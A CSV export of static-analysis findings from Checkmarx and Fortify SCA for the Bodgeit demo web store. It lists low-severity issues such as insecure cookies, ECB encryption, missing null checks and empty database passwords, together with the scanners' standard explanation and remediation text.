"DemoApps","","Bodgeit","478","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","572","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","396","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","512","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","594","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","462","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","641","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","663","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","277","Stored_Boundary_Violation","","Low","Open","2015-10-15","Checkmarx","646","Reliance on File Name or Extension of Externally-Supplied File","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","497","Stored_Boundary_Violation","","Low","Open","2015-10-15","Checkmarx","646","Reliance on File Name or Extension of Externally-Supplied File","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","402","Sensitive_Cookie_in_HTTPS_Session_Without_Secure_Attribute","","Low","Open","2015-10-15","Checkmarx","614","Sensitive Cookie in HTTPS Session Without 'Secure' Attribute","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","608","Sensitive_Cookie_in_HTTPS_Session_Without_Secure_Attribute","","Low","Open","2015-10-15","Checkmarx","614","Sensitive Cookie in HTTPS Session Without 'Secure' Attribute","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","505","Sensitive_Cookie_in_HTTPS_Session_Without_Secure_Attribute","","Low","Open","2015-10-15","Checkmarx","614","Sensitive Cookie in HTTPS Session Without 'Secure' Attribute","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","255","Cookie Security: Cookie not Sent Over SSL","","Low","Open","2015-10-15","Fortify SCA","614","Sensitive Cookie in HTTPS Session Without 'Secure' Attribute","","root/basket.jsp","","","http://localhost/root/basket.jsp","","","","Abstract: <Content>A cookie is created without the <code>secure</code> flag set to <code>true</code>.</Content> Explanation: <Content>Modern web browsers support a <code>secure</code> flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier. <Paragraph> In this case a cookie is created in <Replace key=""FirstTraceLocation.file""/> at line <Replace key=""FirstTraceLocation.line""/>, but <code>setSecure()</code> is not called or is called with the value <code>false</code>. </Paragraph> <b>Example 1:</b> In the example below, a cookie added to the response without setting the <code>secure</code> flag. <pre> Cookie cookie = new Cookie(""emailCookie"", email); response.addCookie(cookie); </pre> If your application uses both HTTPS and HTTP but does not set the <code>secure</code> flag, cookies set during an HTTPS request will also be sent during subsequent HTTP requests. Sniffing network traffic over unencrypted wireless connections is a trivial task for attackers, so sending cookies (especially those with session IDs) over HTTP can result in application compromise.</Content>","Recommendations: <Content>Set the <code>Secure</code> flag on all new cookies in order to instruct browsers not to send these cookies in the clear. This can be done by calling <code>setSecure(true)</code>. <b>Example 2:</b> <pre> Cookie cookie = new Cookie(""emailCookie"", email); cookie.setSecure(true); response.addCookie(cookie); </pre></Content>","","",""
"DemoApps","","Bodgeit","142","Cookie Security: Cookie not Sent Over SSL","","Low","Open","2015-10-15","Fortify SCA","614","Sensitive Cookie in HTTPS Session Without 'Secure' Attribute","","root/login.jsp","username","","http://localhost/root/login.jsp","","","","Abstract: <Content>A cookie is created without the <code>secure</code> flag set to <code>true</code>.</Content> Explanation: <Content>Modern web browsers support a <code>secure</code> flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier. <Paragraph> In this case a cookie is created in <Replace key=""FirstTraceLocation.file""/> at line <Replace key=""FirstTraceLocation.line""/>, but <code>setSecure()</code> is not called or is called with the value <code>false</code>. </Paragraph> <b>Example 1:</b> In the example below, a cookie added to the response without setting the <code>secure</code> flag. <pre> Cookie cookie = new Cookie(""emailCookie"", email); response.addCookie(cookie); </pre> If your application uses both HTTPS and HTTP but does not set the <code>secure</code> flag, cookies set during an HTTPS request will also be sent during subsequent HTTP requests. Sniffing network traffic over unencrypted wireless connections is a trivial task for attackers, so sending cookies (especially those with session IDs) over HTTP can result in application compromise.</Content>","Recommendations: <Content>Set the <code>Secure</code> flag on all new cookies in order to instruct browsers not to send these cookies in the clear. This can be done by calling <code>setSecure(true)</code>. <b>Example 2:</b> <pre> Cookie cookie = new Cookie(""emailCookie"", email); cookie.setSecure(true); response.addCookie(cookie); </pre></Content>","","",""
"DemoApps","","Bodgeit","202","Cookie Security: Cookie not Sent Over SSL","","Low","Open","2015-10-15","Fortify SCA","614","Sensitive Cookie in HTTPS Session Without 'Secure' Attribute","","root/register.jsp","username","","http://localhost/root/register.jsp","","","","Abstract: <Content>A cookie is created without the <code>secure</code> flag set to <code>true</code>.</Content> Explanation: <Content>Modern web browsers support a <code>secure</code> flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier. <Paragraph> In this case a cookie is created in <Replace key=""FirstTraceLocation.file""/> at line <Replace key=""FirstTraceLocation.line""/>, but <code>setSecure()</code> is not called or is called with the value <code>false</code>. </Paragraph> <b>Example 1:</b> In the example below, a cookie added to the response without setting the <code>secure</code> flag. <pre> Cookie cookie = new Cookie(""emailCookie"", email); response.addCookie(cookie); </pre> If your application uses both HTTPS and HTTP but does not set the <code>secure</code> flag, cookies set during an HTTPS request will also be sent during subsequent HTTP requests. Sniffing network traffic over unencrypted wireless connections is a trivial task for attackers, so sending cookies (especially those with session IDs) over HTTP can result in application compromise.</Content>","Recommendations: <Content>Set the <code>Secure</code> flag on all new cookies in order to instruct browsers not to send these cookies in the clear. This can be done by calling <code>setSecure(true)</code>. <b>Example 2:</b> <pre> Cookie cookie = new Cookie(""emailCookie"", email); cookie.setSecure(true); response.addCookie(cookie); </pre></Content>","","",""
"DemoApps","","Bodgeit","157","Trust Boundary Violation","","Low","Open","2015-10-15","Fortify SCA","501","Trust Boundary Violation","","root/login.jsp","","","http://localhost/root/login.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> commingles trusted and untrusted data in the same data structure, which encourages programmers to mistakenly trust unvalidated data.<AltParagraph>Commingling trusted and untrusted data in the same data structure encourages programmers to mistakenly trust unvalidated data.</AltParagraph></Paragraph></Content> Explanation: <Content>A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary--to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. The most common way to make this mistake is to allow trusted and untrusted data to commingle in the same data structure. <Paragraph> In this case the untrusted data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. The data is added to what is generally used as a trusted data structure at the call to <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> <b>Example:</b> The following Java code accepts an HTTP request and stores the <code>usrname</code> parameter in the HTTP session object before checking to ensure that the user has been authenticated. <pre> usrname = request.getParameter(""usrname""); if (session.getAttribute(ATTR_USR) == null) { session.setAttribute(ATTR_USR, usrname); } </pre> Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated.</Content>","Recommendations: <Content>Define clear trust boundaries in the application. Do not use the same data structure to hold trusted data in some contexts and untrusted data in other contexts. Minimize the number of ways that data can move across a trust boundary. Trust boundary violations sometimes occur when input needs to be built up over a series of user interactions before being processed. It may not be possible to do complete input validation until all of the data has arrived. In these situations, it is still important to maintain a trust boundary. The untrusted data should be built up in a single untrusted data structure, validated, and then moved into a trusted location.</Content> Tips: 1.Do not feel that you need to find a ""smoking gun"" situation in which data that has not been validated is assumed to be trusted. If trust boundaries are not clearly delineated and respected, validation errors are inevitable. Instead of spending time searching for an exploitable scenario, concentrate on teaching programmers to create good trust boundaries. 2.Most programs have trust boundaries that are defined by the semantics of the application. Consider writing custom rules to check for other places where user input crosses a trust boundary. 3.A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the HPE Security Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.","","",""
"DemoApps","","Bodgeit","219","Trust Boundary Violation","","Low","Open","2015-10-15","Fortify SCA","501","Trust Boundary Violation","","root/login.jsp","","","http://localhost/root/login.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> commingles trusted and untrusted data in the same data structure, which encourages programmers to mistakenly trust unvalidated data.<AltParagraph>Commingling trusted and untrusted data in the same data structure encourages programmers to mistakenly trust unvalidated data.</AltParagraph></Paragraph></Content> Explanation: <Content>A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary--to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. The most common way to make this mistake is to allow trusted and untrusted data to commingle in the same data structure. <Paragraph> In this case the untrusted data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. The data is added to what is generally used as a trusted data structure at the call to <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> <b>Example:</b> The following Java code accepts an HTTP request and stores the <code>usrname</code> parameter in the HTTP session object before checking to ensure that the user has been authenticated. <pre> usrname = request.getParameter(""usrname""); if (session.getAttribute(ATTR_USR) == null) { session.setAttribute(ATTR_USR, usrname); } </pre> Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated.</Content>","Recommendations: <Content>Define clear trust boundaries in the application. Do not use the same data structure to hold trusted data in some contexts and untrusted data in other contexts. Minimize the number of ways that data can move across a trust boundary. Trust boundary violations sometimes occur when input needs to be built up over a series of user interactions before being processed. It may not be possible to do complete input validation until all of the data has arrived. In these situations, it is still important to maintain a trust boundary. The untrusted data should be built up in a single untrusted data structure, validated, and then moved into a trusted location.</Content> Tips: 1.Do not feel that you need to find a ""smoking gun"" situation in which data that has not been validated is assumed to be trusted. If trust boundaries are not clearly delineated and respected, validation errors are inevitable. Instead of spending time searching for an exploitable scenario, concentrate on teaching programmers to create good trust boundaries. 2.Most programs have trust boundaries that are defined by the semantics of the application. Consider writing custom rules to check for other places where user input crosses a trust boundary. 3.A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the HPE Security Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.","","",""
"DemoApps","","Bodgeit","261","Trust Boundary Violation","","Low","Open","2015-10-15","Fortify SCA","501","Trust Boundary Violation","","root/register.jsp","username","","http://localhost/root/register.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> commingles trusted and untrusted data in the same data structure, which encourages programmers to mistakenly trust unvalidated data.<AltParagraph>Commingling trusted and untrusted data in the same data structure encourages programmers to mistakenly trust unvalidated data.</AltParagraph></Paragraph></Content> Explanation: <Content>A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary--to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. The most common way to make this mistake is to allow trusted and untrusted data to commingle in the same data structure. <Paragraph> In this case the untrusted data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. The data is added to what is generally used as a trusted data structure at the call to <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> <b>Example:</b> The following Java code accepts an HTTP request and stores the <code>usrname</code> parameter in the HTTP session object before checking to ensure that the user has been authenticated. <pre> usrname = request.getParameter(""usrname""); if (session.getAttribute(ATTR_USR) == null) { session.setAttribute(ATTR_USR, usrname); } </pre> Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated.</Content>","Recommendations: <Content>Define clear trust boundaries in the application. Do not use the same data structure to hold trusted data in some contexts and untrusted data in other contexts. Minimize the number of ways that data can move across a trust boundary. Trust boundary violations sometimes occur when input needs to be built up over a series of user interactions before being processed. It may not be possible to do complete input validation until all of the data has arrived. In these situations, it is still important to maintain a trust boundary. The untrusted data should be built up in a single untrusted data structure, validated, and then moved into a trusted location.</Content> Tips: 1.Do not feel that you need to find a ""smoking gun"" situation in which data that has not been validated is assumed to be trusted. If trust boundaries are not clearly delineated and respected, validation errors are inevitable. Instead of spending time searching for an exploitable scenario, concentrate on teaching programmers to create good trust boundaries. 2.Most programs have trust boundaries that are defined by the semantics of the application. Consider writing custom rules to check for other places where user input crosses a trust boundary. 3.A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the HPE Security Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.","","",""
"DemoApps","","Bodgeit","195","Missing Check against Null","","Low","Open","2015-10-15","Fortify SCA","690","Unchecked Return Value to NULL Pointer Dereference","","root/basket.jsp","productid","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> can dereference a null pointer on line <Replace key=""LastTraceLocation.line""/> because it does not check the return value of <Replace key=""PrimaryCall.name""/>, which might return null.<AltParagraph>The program can dereference a null pointer because it does not check the return value of a function that might return null.</AltParagraph></Paragraph></Content> Explanation: <Content>Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break. Two dubious assumptions that are easy to spot in code are ""this function call can never fail"" and ""it doesn't matter if this function call fails"". When a programmer ignores the return value from a function, they implicitly state that they are operating under one of these assumptions. <Paragraph> In this case, an earlier return value is used without being checked in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code does not check to see if the string returned by <code>getParameter()</code> is <code>null</code> before calling the member function <code>compareTo()</code>, potentially causing a null dereference. <pre> String itemName = request.getParameter(ITEM_NAME); if (itemName.compareTo(IMPORTANT_ITEM)) { ... } ... </pre> <b>Example 2:</b>. The following code shows a system property that is set to <code>null</code> and later dereferenced by a programmer who mistakenly assumes it will always be defined. <pre> System.clearProperty(""os.name""); ... String os = System.getProperty(""os.name""); if (os.equalsIgnoreCase(""Windows 95"") ) System.out.println(""Not supported""); </pre> The traditional defense of this coding error is: ""I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value."" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.</Content>","Recommendations: <Content>If a function can return an error code or any other evidence of its success or failure, always check for the error condition, even if there is no obvious way for it to occur. In addition to preventing security errors, many initially mysterious bugs have eventually led back to a failed method call with an unchecked return value. Create an easy to use and standard way for dealing with failure in your application. If error handling is straightforward, programmers will be less inclined to omit it. One approach to standardized error handling is to write wrappers around commonly-used functions that check and handle error conditions without additional programmer intervention. When wrappers are implemented and adopted, the use of non-wrapped equivalents can be prohibited and enforced by using custom rules. <b>Example 3:</b> The following code implements a wrapper around <code>getParameter()</code> that checks the return value of <code>getParameter()</code> against <code>null</code> and uses a default value if the requested parameter is not defined. <pre> String safeGetParameter (HttpRequest request, String name) { String value = request.getParameter(name); if (value == null) { return getDefaultValue(name) } return value; } </pre></Content> Tips: 1.Watch out for programmers who want to explain away this type of issue by saying ""that can never happen because ..."". Chances are good that they have developed their intuition about the way the system works by using their development workstation. If your software will eventually run under different operating systems, operating system versions, hardware configurations, or runtime environments, their intuition may not apply.","","",""
"DemoApps","","Bodgeit","207","Missing Check against Null","","Low","Open","2015-10-15","Fortify SCA","690","Unchecked Return Value to NULL Pointer Dereference","","root/basket.jsp","productid","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> can dereference a null pointer on line <Replace key=""LastTraceLocation.line""/> because it does not check the return value of <Replace key=""PrimaryCall.name""/>, which might return null.<AltParagraph>The program can dereference a null pointer because it does not check the return value of a function that might return null.</AltParagraph></Paragraph></Content> Explanation: <Content>Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break. Two dubious assumptions that are easy to spot in code are ""this function call can never fail"" and ""it doesn't matter if this function call fails"". When a programmer ignores the return value from a function, they implicitly state that they are operating under one of these assumptions. <Paragraph> In this case, an earlier return value is used without being checked in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code does not check to see if the string returned by <code>getParameter()</code> is <code>null</code> before calling the member function <code>compareTo()</code>, potentially causing a null dereference. <pre> String itemName = request.getParameter(ITEM_NAME); if (itemName.compareTo(IMPORTANT_ITEM)) { ... } ... </pre> <b>Example 2:</b>. The following code shows a system property that is set to <code>null</code> and later dereferenced by a programmer who mistakenly assumes it will always be defined. <pre> System.clearProperty(""os.name""); ... String os = System.getProperty(""os.name""); if (os.equalsIgnoreCase(""Windows 95"") ) System.out.println(""Not supported""); </pre> The traditional defense of this coding error is: ""I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value."" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.</Content>","Recommendations: <Content>If a function can return an error code or any other evidence of its success or failure, always check for the error condition, even if there is no obvious way for it to occur. In addition to preventing security errors, many initially mysterious bugs have eventually led back to a failed method call with an unchecked return value. Create an easy to use and standard way for dealing with failure in your application. If error handling is straightforward, programmers will be less inclined to omit it. One approach to standardized error handling is to write wrappers around commonly-used functions that check and handle error conditions without additional programmer intervention. When wrappers are implemented and adopted, the use of non-wrapped equivalents can be prohibited and enforced by using custom rules. <b>Example 3:</b> The following code implements a wrapper around <code>getParameter()</code> that checks the return value of <code>getParameter()</code> against <code>null</code> and uses a default value if the requested parameter is not defined. <pre> String safeGetParameter (HttpRequest request, String name) { String value = request.getParameter(name); if (value == null) { return getDefaultValue(name) } return value; } </pre></Content> Tips: 1.Watch out for programmers who want to explain away this type of issue by saying ""that can never happen because ..."". Chances are good that they have developed their intuition about the way the system works by using their development workstation. If your software will eventually run under different operating systems, operating system versions, hardware configurations, or runtime environments, their intuition may not apply.","","",""
"DemoApps","","Bodgeit","279","Unsynchronized_Access_To_Shared_Data","","Low","Open","2015-10-15","Checkmarx","567","Unsynchronized Access to Shared Data in a Multithreaded Context","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","465","Unsynchronized_Access_To_Shared_Data","","Low","Open","2015-10-15","Checkmarx","567","Unsynchronized Access to Shared Data in a Multithreaded Context","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","567","Unsynchronized_Access_To_Shared_Data","","Low","Open","2015-10-15","Checkmarx","567","Unsynchronized Access to Shared Data in a Multithreaded Context","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","585","Unsynchronized_Access_To_Shared_Data","","Low","Open","2015-10-15","Checkmarx","567","Unsynchronized Access to Shared Data in a Multithreaded Context","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","646","Unsynchronized_Access_To_Shared_Data","","Low","Open","2015-10-15","Checkmarx","567","Unsynchronized Access to Shared Data in a Multithreaded Context","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","464","Client_DOM_Open_Redirect","","Low","Open","2015-10-15","Checkmarx","601","URL Redirection to Untrusted Site ('Open Redirect')","A10","/bodgeit/root/advanced.jsp","","","http://localhost/bodgeit/root/advanced.jsp","","","","","","","",""
"DemoApps","","Bodgeit","243","Weak Encryption: Insecure Mode of Operation","","Low","Open","2015-10-15","Fortify SCA","327","Use of a Broken or Risky Cryptographic Algorithm","A6","src/com/thebodgeitstore/util/AES.java","","","http://localhost/src/com/thebodgeitstore/util/AES.java","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> uses a cryptographic encryption algorithm with an insecure mode of operation on line <Replace key=""PrimaryLocation.line""/>.<AltParagraph>Cryptographic encryption algorithms should not be used with an insecure mode of operation.</AltParagraph></Paragraph></Content> Explanation: <Content>A mode of operation of a block cipher is an algorithm that describes how to repeatedly apply a cipher's single-block operation to securely transform amounts of data larger than a block. Some of the modes of operation include Electronic Codebook (ECB), Cipher Block Chaining (CBC), and Cipher Feedback (CFB). ECB mode is inherently weak, because it results in the same ciphertext for identical blocks of plaintext. CBC mode is the superior choice as it does not have this weakness. <b>Example 1:</b> The following code uses AES cipher with ECB mode: <pre> ... SecretKeySpec key = new SecretKeySpec(keyBytes, ""AES""); Cipher cipher = Cipher.getInstance(""AES/ECB/PKCS7Padding"", ""BC""); cipher.init(Cipher.ENCRYPT_MODE, key); ... </pre> <b>Cipher Transformation Modes:</b> The first argument to <code>Cipher.getInstance</code> is a string parameter <code>transformation</code> in the form ""algorithm/mode/padding"" or ""algorithm"". If the mode is not specified, then the mode selected is the provider-specific default, which is likely Electronic Codebook (ECB) mode for Java and Android. ECB mode is inherently a weaker encryption mode because identical blocks of plaintext is encrypted into identical blocks of ciphertext. CBC (cipher-block chaining) mode is superior because it does not have this weakness. <b>Example</b>: gaining a Cipher instance with the weak ECB transformation mode: <pre> Cipher c = Cipher.getInstance(""AES/ECB/PKCS5Padding""); </pre> <b>Example</b>: gaining a Cipher instance with default transformation mode, which could be the weak ECB mode: <pre> Cipher c = Cipher.getInstance(""AES""); </pre> This finding is from research found in ""An Empirical Study of Cryptographic Misuse in Android Applications"". http://www.cs.ucsb.edu/~chris/research/doc/ccs13_cryptolint.pdf </Content>","Recommendations: <Content>Avoid using ECB mode of operation when encrypting data larger than a block. CBC mode is superior because it does not produce identical blocks of ciphertext for identical blocks of plaintext. However, CBC mode is somewhat inefficient and poses serious risk if used with SSL. [1] Instead, use CCM (Counter with CBC-MAC) mode, or, if performance is a concern, GCM (Galois/Counter Mode) mode where they are available. <b>Example 2:</b> The following code uses the AES cipher with CBC mode: <pre> ... SecretKeySpec key = new SecretKeySpec(keyBytes, ""AES""); Cipher cipher = Cipher.getInstance(""AES/CBC/PKCS5Padding"", ""BC""); cipher.init(Cipher.ENCRYPT_MODE, key); ... </pre></Content>","","",""
"DemoApps","","Bodgeit","323","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","588","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/advanced.jsp","","","http://localhost/bodgeit/root/advanced.jsp","","","","","","","",""
"DemoApps","","Bodgeit","341","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","458","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","482","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/dbconnection.jspf","","","http://localhost/bodgeit/root/dbconnection.jspf","","","","","","","",""
"DemoApps","","Bodgeit","302","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","408","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/init.jsp","","","http://localhost/bodgeit/root/init.jsp","","","","","","","",""
"DemoApps","","Bodgeit","308","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","521","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/password.jsp","","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","292","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/product.jsp","","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","316","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","467","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/score.jsp","","","http://localhost/bodgeit/root/score.jsp","","","","","","","",""
"DemoApps","","Bodgeit","486","Empty_Password_In_Connection_String","","Low","Open","2015-10-15","Checkmarx","259","Use of Hard-coded Password","","/bodgeit/root/search.jsp","","","http://localhost/bodgeit/root/search.jsp","","","","","","","",""
